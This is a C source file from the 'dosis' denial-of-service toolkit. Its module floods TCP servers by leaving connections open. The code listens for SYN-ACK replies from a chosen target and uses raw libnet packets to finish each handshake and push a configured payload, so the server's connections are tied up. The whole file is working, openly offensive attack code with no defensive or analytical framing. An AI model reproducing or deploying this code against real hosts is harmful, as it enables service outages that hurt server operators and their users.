/*****************************************************************************
 * tcpopen.c
 *
 * DoS on TCP servers by leaving connections opened.
 *
 * ---------------------------------------------------------------------------
 * dosis - DoS: Internet Sodomizer
 *   (C) 2008-2009 Gerardo García Peña <gerardo@kung-foo.net>
 *
 *   This program is free software; you can redistribute it and/or modify it
 *   under the terms of the GNU General Public License as published by the Free
 *   Software Foundation; either version 2 of the License, or (at your option)
 *   any later version.
 *
 *   This program is distributed in the hope that it will be useful, but WITHOUT
 *   ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 *   FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for
 *   more details.
 *
 *   You should have received a copy of the GNU General Public License along
 *   with this program; if not, write to the Free Software Foundation, Inc., 51
 *   Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 *****************************************************************************/

#include <config.h>

#include "log.h"
#include "dosis.h"
#include "dosconfig.h"
#include "tea.h"
#include "tcpopen.h"
#include "lnet.h"
#include "payload.h"
#include "pthreadex.h"
#include "ip.h"

#define BUFSIZE    2048

typedef struct _tag_TCPOPEN_CFG {
  INET_ADDR      shost;
  INET_ADDR      dhost;
  TEA_TYPE_INT   mss;
  TEA_TYPE_INT   npackets;
  TEA_TYPE_DATA  payload;
  LN_CONTEXT    *lnc;
} TCPOPEN_CFG;

/*****************************************************************************
 * THREAD IMPLEMENTATION
 *****************************************************************************/

static int tcpopen__listen_check(THREAD_WORK *tw, char *msg, unsigned int size)
{
  TCPOPEN_CFG *tc = (TCPOPEN_CFG *) tw->data;

  /* check msg size and headers */
  if(size < sizeof(struct iphdr)
  || IP_PROTOCOL(msg) != 6
  || size < sizeof(struct tcphdr) + (IP_HEADER(msg)->ihl << 2))
    return 0;

  TDBG("Checking packet:");
  TDBG("  - IP_HEADER(msg)->saddr == tc->dhost.addr.in.addr  = %d",
       IP_HEADER(msg)->saddr == tc->dhost.addr.in.addr);
  TDBG("  - ntohs(TCP_HEADER(msg)->source) == tc->dhost.port = %d",
       ntohs(TCP_HEADER(msg)->source) == tc->dhost.port);
  /* check msg */
  return IP_HEADER(msg)->saddr == tc->dhost.addr.in.addr
      && ntohs(TCP_HEADER(msg)->source) == tc->dhost.port
         ? -1 : 0;
}

static void tcpopen__thread(THREAD_WORK *tw)
{
  TCPOPEN_CFG *tc = (TCPOPEN_CFG *) tw->data;
  TEA_MSG *m;

  /* listen the radio */
  while(1)
  {
    /* check for messages */
    m = tea_thread_msg_wait(tw);

    TDBG2("Received << %d - %d.%d.%d.%d:%d/%d (rst=%d,syn=%d,ack=%d) => [%08x/%08x] >>",
            IP_PROTOCOL(m->b),
            (IP_HEADER(m->b)->saddr >>  0) & 0x00ff,
            (IP_HEADER(m->b)->saddr >>  8) & 0x00ff,
            (IP_HEADER(m->b)->saddr >> 16) & 0x00ff,
            (IP_HEADER(m->b)->saddr >> 24) & 0x00ff,
            TCP_HEADER(m->b)->dest, tc->dhost.port,
            TCP_HEADER(m->b)->rst,
            TCP_HEADER(m->b)->syn,
            TCP_HEADER(m->b)->ack,
            IP_HEADER(m->b)->saddr, tc->shost.addr.in.addr);

    /* in some special case (handshake) send kakitas */
    if(TCP_HEADER(m->b)->syn != 0
    && TCP_HEADER(m->b)->ack != 0)
    {
      /* send handshake and data TCP packet */
      ln_send_tcp_packet(tc->lnc,
                         &tc->shost.addr.in.inaddr, ntohs(TCP_HEADER(m->b)->dest),
                         &tc->dhost.addr.in.inaddr, tc->dhost.port,
                         TH_ACK,
                         13337, //5840, //ntohs(tcp_header(m->b)->window),
                         ntohl(TCP_HEADER(m->b)->ack_seq),
                         ntohl(TCP_HEADER(m->b)->seq) + 1,
                         NULL, 0,
                         NULL, 0);
      ln_send_tcp_packet(tc->lnc,
                         &tc->shost.addr.in.inaddr, ntohs(TCP_HEADER(m->b)->dest),
                         &tc->dhost.addr.in.inaddr, tc->dhost.port,
                         TH_ACK | TH_PUSH,
                         13337, //5840, //ntohs(tcp_header(m->b)->window),
                         ntohl(TCP_HEADER(m->b)->ack_seq),
                         ntohl(TCP_HEADER(m->b)->seq) + 1,
                         (char *) tc->payload.data, tc->payload.size,
                         NULL, 0);
    }

/* XXX WTF XXX */
#if 0
    if(tcp_header(m->b)->syn == 0
    && tcp_header(m->b)->ack == 0)
    {
      TDBG2("XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX SUZUKI DE SESION");
      ln_send_tcp_packet(tc->lnc,
                         &tc->shost.addr.in.inaddr, ntohs(tcp_header(m->b)->dest),
                         &tc->dhost.addr.in.inaddr, tc->dhost.port,
                         TH_ACK,
                         ntohs(tcp_header(m->b)->window),
                         ntohl(tcp_header(m->b)->ack_seq),
                         ntohl(tcp_header(m->b)->seq) + 1,
                         NULL, 0);
    }
#endif

    /* release msg buffer */
    msg_release(m);
  }
}

/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 * CONFIGURATION. 
 *   Is important to consider that this function could be
 *   called several times during thread live: initial
 *   configuration and reconfigurations.
 *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

static int tcpopen__configure(THREAD_WORK *tw, SNODE *command, int first_time)
{
  TCPOPEN_CFG *tc = (TCPOPEN_CFG *) tw->data;

  /* initialize specialized work thread data */
  if(first_time)
  {
    /* initialize libnet */
    if((tc->lnc = calloc(1, sizeof(LN_CONTEXT))) == NULL)
    {
      TERR("No memory for LN_CONTEXT.");
      return -1;
    }
    ln_init_context(tc->lnc);
  }

  /* configure src address (if not defined) */
  if(tc->shost.type == INET_FAMILY_NONE
  && dos_get_source_address(&tc->shost, &tc->dhost))
    return -1;

  /* (debug) print configuration */
  {
    char buff[255];

    TDBG2("config.periodic.bytes  = %d", tc->payload.size);

    ip_addr_snprintf(&tc->shost, sizeof(buff)-1, buff);
    TDBG2("config.options.shost   = %s", buff);
    ip_addr_snprintf(&tc->dhost, sizeof(buff)-1, buff);
    TDBG2("config.options.dhost   = %s", buff);
    TDBG2("config.options.payload = %d bytes", tc->payload.size);
  }

  return 0;
}

static void tcpopen__cleanup(THREAD_WORK *tw)
{
  TCPOPEN_CFG *tc = (TCPOPEN_CFG *) tw->data;

  if(tc)
  {
    /* collect libnet data */
    if(tc->lnc)
    {
      ln_destroy_context(tc->lnc);
      free(tc->lnc);
      tc->lnc = NULL;
    }
    if(tc->payload.data)
    {
      free(tc->payload.data);
      tc->payload.data = NULL;
    }
  }
  TDBG("Finalized.");
}

/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 * TEA OBJECT
 *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

TOC_BEGIN(teaTCPOPEN_cfg)
  TOC("src_addr", TEA_TYPE_ADDR, 0, TCPOPEN_CFG, shost,   NULL)
  TOC("src_port", TEA_TYPE_PORT, 0, TCPOPEN_CFG, shost,   NULL)
  TOC("dst_addr", TEA_TYPE_ADDR, 1, TCPOPEN_CFG, dhost,   NULL)
  TOC("dst_port", TEA_TYPE_PORT, 0, TCPOPEN_CFG, dhost,   NULL)
  TOC("tcp_mss",  TEA_TYPE_INT,  0, TCPOPEN_CFG, mss,     NULL)
  TOC("payload",  TEA_TYPE_DATA, 1, TCPOPEN_CFG, payload, NULL)
TOC_END

TEA_OBJECT teaTCPOPEN = {
  .name         = "TCPOPEN",
  .datasize     = sizeof(TCPOPEN_CFG),
  .configure    = tcpopen__configure,
  .cleanup      = tcpopen__cleanup,
  .thread       = tcpopen__thread,
  .listen       = 1,
  .listen_check = tcpopen__listen_check,
  .cparams      = teaTCPOPEN_cfg
};

